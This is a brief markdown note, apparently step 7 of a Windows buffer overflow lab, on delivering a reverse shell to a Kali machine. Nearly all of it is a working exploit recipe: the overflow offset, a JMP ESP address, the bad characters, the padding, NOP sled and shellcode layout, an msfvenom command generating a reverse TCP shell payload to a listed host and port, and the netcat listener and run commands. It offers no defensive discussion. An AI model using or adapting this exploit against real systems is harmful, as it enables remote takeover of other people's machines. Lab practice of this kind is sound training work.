# 7. Shellcode Injection and Exploitation

## 🧠 Goal:
- Deliver reverse shell to Kali from vulnerable Windows machine

## 🔧 Configuration:
- Target IP: 192.168.0.xxx
- Attacker (Kali) IP: 192.168.0.xxx
- Offset: 2003
- JMP ESP: 0x625011AF (`\xAF\x11\x50\x62`)
- Bad chars: `\x00`

## 📦 Exploit Layout:
"A"*2003 + JMP ESP + "\x90"*16 + shellcode


## 🎯 Shellcode:
Generated with:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.103 LPORT=4444 EXITFUNC=thread -f python -b "\x00"
▶️ Run:
On Kali:

bash
nc -lvnp 4444
On attacker terminal:

bash
python3 shellcode.py
